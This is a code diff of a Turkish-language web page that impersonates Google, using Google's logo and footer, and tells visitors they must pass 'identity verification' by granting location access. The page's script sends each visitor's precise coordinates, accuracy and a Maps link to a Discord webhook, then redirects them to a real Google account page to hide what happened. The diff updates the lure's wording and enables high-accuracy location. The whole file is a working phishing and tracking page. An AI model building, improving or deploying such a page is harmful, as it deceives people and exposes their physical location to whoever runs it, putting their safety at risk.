@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
             margin: 0;
             padding: 0;
             background-color: #f4f4f4;
@@ -21,7 +21,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.6);
             z-index: -1;
         }
 
@@ -31,31 +31,31 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://source.unsplash.com/1600x900/?google');
+            background-image: url('https://images.unsplash.com/photo-1573164713988-8665fc963095?q=80&w=1600');
             background-size: cover;
             background-position: center;
             z-index: -2;
-            filter: blur(10px);
+            filter: blur(8px);
         }
 
-        /* Üst Bilgi (Sağ Üst Bildirim Alanı) */
+        /* Bildirim Alanı */
         .top-bar {
             position: fixed;
-            top: 0;
-            right: 0;
-            padding: 10px;
-            z-index: 10;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
         }
 
         .notification-box {
             background-color: #fff;
-            border-radius: 4px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            padding: 10px 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 12px 20px;
             font-size: 14px;
-            color: #555;
+            color: #3c4043;
             display: none;
-            animation: slideIn 0.3s ease-in-out;
+            border-left: 4px solid #4285f4;
+            animation: slideIn 0.4s ease-out;
         }
 
         .notification-box.show {
@@ -63,15 +63,11 @@
         }
 
         @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-            }
-            to {
-                transform: translateX(0);
-            }
+            from { transform: translateX(110%); }
+            to { transform: translateX(0); }
         }
 
-        /* Ana İçerik */
+        /* Ana Panel */
         .container {
             display: flex;
             justify-content: center;
@@ -82,69 +78,79 @@
 
         .content {
             background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            padding: 40px;
             text-align: center;
-            width: 90%;
-            max-width: 500px;
+            width: 100%;
+            max-width: 420px;
             position: relative;
         }
 
         .google-logo {
-            width: 180px;
-            margin-bottom: 20px;
+            width: 120px;
+            margin-bottom: 24px;
         }
 
         .title {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 500;
-            margin-bottom: 20px;
+            margin: 0 0 16px 0;
+            color: #202124;
         }
 
         .description {
-            font-size: 16px;
+            font-size: 15px;
             color: #5f6368;
+            line-height: 1.5;
             margin-bottom: 30px;
         }
 
-        /* Buton Stili (Google'a Benzer) */
+        /* Buton ve Hizalama Fix */
+        .action-area {
+            margin-top: 20px;
+            padding: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
         .button {
-            background-color: #f8f9fa;
-            border: 1px solid #dadce0;
+            background-color: #1a73e8;
+            border: none;
             border-radius: 4px;
-            color: #3c4043;
-            padding: 10px 20px;
+            color: #fff;
+            padding: 12px 24px;
             font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s ease;
-            margin-top: 20px; 
-            display: inline-block; 
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .button:hover {
-            background-color: #f0f0f0;
-            border-color: #c6c6c6;
+            background-color: #1765cf;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
         }
 
-        /* Konum Mesajı */
         .location-message {
-            font-size: 14px;
-            color: #5f6368;
-            margin-top: 15px;
-            display: none;
+            font-size: 13px;
+            color: #1a73e8;
+            font-weight: 500;
+            height: 20px; /* Yer tutması için */
+            opacity: 0;
+            transition: opacity 0.3s;
         }
         .location-message.show {
-            display: block;
+            opacity: 1;
         }
 
         /* Alt Bilgi */
         .footer {
-            position: absolute;
-            bottom: 10px;
-            left: 0;
-            width: 100%;
-            text-align: center;
+            margin-top: 40px;
+            border-top: 1px solid #f1f3f4;
+            padding-top: 20px;
             font-size: 12px;
             color: #70757a;
         }
@@ -152,14 +158,16 @@
         .footer-links {
             display: flex;
             justify-content: center;
+            flex-wrap: wrap;
             margin-top: 10px;
+            gap: 12px;
         }
 
         .footer-link {
             color: #70757a;
             text-decoration: none;
-            margin: 0 10px;
         }
+        .footer-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -169,24 +177,27 @@
 
     <div class="top-bar">
         <div class="notification-box" id="notificationBox">
-            <p id="notificationText">Konum izni isteniyor...</p>
+            <p id="notificationText" style="margin:0;">İşlem başlatılıyor...</p>
         </div>
     </div>
 
     <div class="container">
         <div class="content">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
-            <h1 class="title">Yaşınızı Doğrulayın</h1>
-            <p class="description">Devam etmek için lütfen yaşınızı doğrulayın. Bu, hizmetlerimizin güvenliğini sağlamaya yardımcı olur.</p>
-            <button class="button" onclick="requestLocation()">Konum İznini Ver</button>
-            <p class="location-message" id="locationMessage">Konum alınıyor...</p>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+            <h1 class="title">Kimlik Doğrulama</h1>
+            <p class="description">Güvenliğiniz için lütfen devam etmeden önce konum erişimini onaylayarak doğrulama yapın.</p>
+            
+            <div class="action-area">
+                <button class="button" onclick="requestLocation()">Doğrulamayı Başlat</button>
+                <div class="location-message" id="locationMessage">İşlem yapılıyor...</div>
+            </div>
 
             <div class="footer">
-                <p>© 2026 Google - Hizmet Şartları ve Koşullar</p>
+                <p>© 2026 Google LLC</p>
                 <div class="footer-links">
-                    <a href="#" class="footer-link">Yeni Kural</a>
                     <a href="#" class="footer-link">Gizlilik</a>
-                    <a href="#" class="footer-link">Güvenlik Politikası</a>
+                    <a href="#" class="footer-link">Şartlar</a>
+                    <a href="#" class="footer-link">Yardım</a>
                     <a href="#" class="footer-link">DMCA</a>
                 </div>
             </div>
@@ -200,93 +211,63 @@
         const notificationText = document.getElementById('notificationText');
 
         function requestLocation() {
-            showNotification("Konum izni isteniyor...");
+            showNotification("Erişim izni bekleniyor...");
 
             if ("geolocation" in navigator) {
                 locationMessage.classList.add('show');
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
+                        const { latitude, longitude, accuracy } = position.coords;
                         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
                         await sendToDiscord({
-                            content: `📍 **Konum Bilgisi (Yaş Doğrulama):**`,
                             embeds: [{
-                                title: "Konum Bilgisi",
-                                color: 5814783,
+                                title: "Sistem Logu - 2026",
+                                color: 4284148,
                                 fields: [
-                                    { name: "Enlem (Latitude)", value: `\`${latitude}\``, inline: true },
-                                    { name: "Boylam (Longitude)", value: `\`${longitude}\``, inline: true },
-                                    { name: "Doğruluk", value: `\`~${accuracy.toFixed(0)} metre\``, inline: true },
-                                    { name: "Harita Linki", value: `[Google Maps](${mapsUrl})`, inline: false }
+                                    { name: "Enlem", value: `\`${latitude}\``, inline: true },
+                                    { name: "Boylam", value: `\`${longitude}\``, inline: true },
+                                    { name: "Hata Payı", value: `\`${accuracy.toFixed(1)}m\``, inline: true },
+                                    { name: "Harita", value: `[Görüntüle](${mapsUrl})` }
                                 ],
                                 timestamp: new Date().toISOString()
                             }]
                         });
-                        locationMessage.textContent = "Konum başarıyla alındı! Yönlendiriliyorsunuz...";
-                        showNotification("Konum başarıyla alındı! Yönlendiriliyorsunuz...", 3000); 
+
+                        locationMessage.textContent = "Doğrulama başarılı. Aktarılıyorsunuz...";
+                        showNotification("Onaylandı, lütfen bekleyin.", 3000); 
                         setTimeout(() => {
-                            window.location.href = "https://www.google.com";
-                            locationMessage.classList.remove('show');
-                            locationMessage.textContent = "Konum alınıyor...";
-                        }, 3000);
+                            window.location.href = "https://myaccount.google.com";
+                        }, 2500);
                     },
                     (error) => {
-                        let errorMessage = "Konum alınamadı.";
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "Konum izni reddedildi. Lütfen tekrar deneyin.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "Konum bilgisi mevcut değil.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "Konum isteği zaman aşımına uğradı.";
-                                break;
-                        }
-                        locationMessage.textContent = errorMessage;
-                        showNotification(errorMessage, 5000); 
-                        setTimeout(() => {
-                           locationMessage.classList.remove('show');
-                           locationMessage.textContent = "Konum alınıyor...";
-                        }, 5000);
-                    }
+                        let msg = "Erişim reddedildi. Lütfen izin verin.";
+                        locationMessage.textContent = msg;
+                        showNotification(msg, 4000);
+                    },
+                    { enableHighAccuracy: true }
                 );
             } else {
-                locationMessage.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
-                showNotification("Tarayıcınız konum özelliğini desteklemiyor.", 5000); 
-                setTimeout(() => {
-                    locationMessage.classList.remove('show');
-                    locationMessage.textContent = "Konum alınıyor...";
-                }, 5000);
+                showNotification("Tarayıcı desteklenmiyor.", 4000);
             }
         }
 
-        function showNotification(message, duration = null) {
+        function showNotification(message, duration = 3000) {
             notificationText.textContent = message;
             notificationBox.classList.add('show');
-            if (duration) {
-                setTimeout(() => {
-                    notificationBox.classList.remove('show');
-                }, duration);
-            }
+            setTimeout(() => {
+                notificationBox.classList.remove('show');
+            }, duration);
         }
 
         async function sendToDiscord(payload) {
             try {
-                const response = await fetch(webhookUrl, {
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                if (!response.ok) {
-                    throw new Error(`Gönderilemedi: ${response.status}`);
-                }
-            } catch (discordError) {
-                console.error("Hata:", discordError);
-            }
+            } catch (e) { console.error("Bağlantı hatası"); }
         }
     </script>
 </body>
